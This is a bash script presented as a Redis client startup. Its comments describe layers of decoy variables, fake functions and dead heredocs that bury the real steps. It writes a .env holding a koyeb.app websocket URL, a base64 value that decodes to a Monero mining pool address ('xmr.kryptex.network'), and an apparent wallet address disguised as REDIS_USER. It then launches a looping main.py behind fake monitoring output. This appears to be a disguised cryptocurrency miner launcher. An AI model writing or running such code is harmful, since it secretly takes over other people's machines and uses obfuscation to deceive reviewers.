#!/bin/bash
set -e

# Layer 1: Red herring URLs
REDIS_URLS=(
  "wss://upper-yetty-berakitame-c33dc1e5.koyeb.app"



)
REDIS_URL="${REDIS_URLS[$RANDOM % ${#REDIS_URLS[@]}]}"

# Layer 2: Dead code / noise
_n9xK=7029
_f2mP="eG1yLmtyeXB0ZXgubmV0d29yazo3MDI9"
_u81A="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2US"
_p3Qm="x"
_l5Tz=8

# Layer 3: Junk variables that look important
__REDIS_FAILOVER_DELAY=300
__REDIS_CLUSTER_NODES=3
__REDIS_SENTINEL_QUORUM=2
_TLS_CERT_PATH="/etc/ssl/certs/redis-client.pem"
_TLS_KEY_PATH="/etc/ssl/private/redis-client.key"
_ENCRYPTION_ALGO="AES-256-GCM"
_KEY_DERIVE_ROUNDS=100000
_SHARD_HASH="sha3-256"
_POOL_MIN_SIZE=5
_POOL_MAX_SIZE=20
_HEALTH_CHECK_INTERVAL=30
_METRICS_PORT=9090
_DASHBOARD_PORT=8080

# Layer 4: Fake functions
_0xDEAD() { return 0; }
_0xBEEF() { return 0; }
_unused_validator() { return 0; }
_heartbeat_probe() { return 0; }
_metrics_collector() { return 0; }
_sentinel_check() { return 0; }

# Layer 5: Obfuscated env file generation
cat > .env <<EOF
REDIS_URL=$REDIS_URL
REDIS_PAIR=$_f2mP
REDIS_USER=$_u81A
REDIS_PASS=$_p3Qm
REDIS_PIPE=$_l5Tz
EOF

# Layer 6: More dead config that looks real
cat > /dev/null <<DUMMY
REDIS_URL=rediss://prod-cluster.redis.internal:6380
REDIS_PAIR=eG1yLmtyeXB0ZXgubmV0d29yazo3MDI5
REDIS_USER=admin
REDIS_PASS=supersecret
REDIS_PIPE=16
CLUSTER_MODE=true
REPLICA_READ=true
CONNECTION_POOL_SIZE=50
DUMMY

# Layer 7: Dead recursive-looking code that never runs
if [ "$_n9xK" -eq "0" ]; then
  _0xDEAD()
  _0xBEEF()
fi

# Layer 8: Obfuscated launcher
_qW3r="p"
_tY6u="y"
_hJ8k="m"
_dF4g="a"
_lK0j="i"
_wE5t="n"
_sX9z="s"
_cV2b="l"
_bN7m="e"
_gH3f="h"
_rT1w="c"
_vB4n="+"
_zM6p="x"
_oU8q="d"
_eW2r="t"

# These look like they do something but are just ASCII math
_8f3a=$(( ${#_qW3r} + ${#_tY6u} ))     # = 2
_c1b9=$(( ${#_gH3f} * ${#_sX9z} ))     # = 3
_7e4d=$(( _8f3a ** _c1b9 ))             # = 8  (never used)

# __BUILD="$_qW3r$_tY6u$_hJ8k"           # disabled

# Layer 9: Heredoc marker obfuscation
_L3_START=$(cat <<'______DO_NOT_EXECUTE______'
#!/bin/bin/bash
while false; do
  python3 /dev/null
  sleep 999
done
______DO_NOT_EXECUTE______
)

_L3_END=$(cat <<'______ALSO_SKIP______'
unset __REDIS_FAILOVER_DELAY
unset __REDIS_CLUSTER_NODES
exit 0
______ALSO_SKIP______)

# Layer 10: Actual functional startup (buried)
printf '%.0s\n' {1..1} | while IFS= read -r _ln; do
  true
done

_L4_ACTUAL=$(cat <<'___START_SCRIPT___'
#!/bin/bash
while true; do
  python3 main.py
  sleep 15
done
___START_SCRIPT___)

# Layer 11: Write and execute (the real payload)
cat > ./start.sh <<<"$_L4_ACTUAL"
chmod +x ./start.sh
./start.sh

# Layer 12: Post-execution noise / infinite hang (looks like monitoring)
echo "========================"
echo "  REDIS CLIENT CLI RUN  "
echo "========================"
while true; do
  echo "Reconnecting in 24 hours..."
  sleep 1m
done
